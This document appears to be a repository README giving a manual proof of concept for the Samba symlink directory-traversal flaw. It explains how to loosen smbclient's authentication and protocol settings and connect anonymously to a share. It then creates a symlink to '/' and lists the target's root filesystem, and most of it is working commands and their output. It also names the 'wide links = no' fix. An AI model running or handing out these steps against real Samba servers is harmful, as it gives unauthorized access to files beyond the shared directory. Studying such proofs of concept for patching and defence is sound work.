# Symlink-Directory-Traversal-smb-manually


Samba symlink traversal manual exploit

### Introduction 

Samba is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input, Exploits would allow an attacker to access files outside of the Samba user's 	root directory to obtain sensitive information and perform other attacks.
Administrators should be careful and set 'wide links = no' in the '[global]' section of 'smb.conf.
 
A proof of concept of Symlink Directory Traversal on Samba, here i will explain how to install the smbclient on an external location to use for the exploitation and also what to change.

The original Manually exploitation explained in the link ( https://www.exploit-db.com/exploits/33599) doesn't work without adding an below lines on exiting smbconfig file..

```
check smb config info

$ testparm

Load smb config files from /etc/samba/smb.conf
```

then first take backup of exisitng smb.conf file 

```
cp smb.conf smb.conf.bak
```

add below lines

```
client lanman auth = yes
client ntlmv2 auth = no
client min protocol = CORE
client max protocol = SMB3
```
Try to connect 

```
$ ./smbclient //10.1.1.136/Share_Name -N

```
### Proof of concept

```
$ ./smbclient //10.1.1.136/Share_Name -N

smb: \> posix
Server supports CIFS extensions 1.0
Server supports CIFS capabilities acls pathnames
smb: \> ls
  .                                   D        0  Sun Jan 13 15:13:58 2019
  ..                                  D        0  Sun Jan 13 15:14:18 2019
		61335 blocks of size 131072. 50251 blocks available

smb: /> symlink / rootfs
smb: /> ls
  .                                   D        0  Sun Jan 13 15:54:10 2019
  ..                                  D        0  Sun Jan 13 15:14:18 2019
  rootfs                              D        0  Wed Aug 26 11:54:18 2009

		61335 blocks of size 131072. 50251 blocks available
smb: /> cd rootfs/
smb: /rootfs/> ls
  .                                   D        0  Wed Aug 26 11:54:18 2009
  ..                                  D        0  Wed Aug 26 11:54:18 2009
  cdrom                               D        0  Thu Sep  6 01:43:19 2007
  var                                 D        0  Thu Sep  6 01:45:53 2007
  selinux                             D        0  Wed Mar  7 23:56:09 2007
  home

```

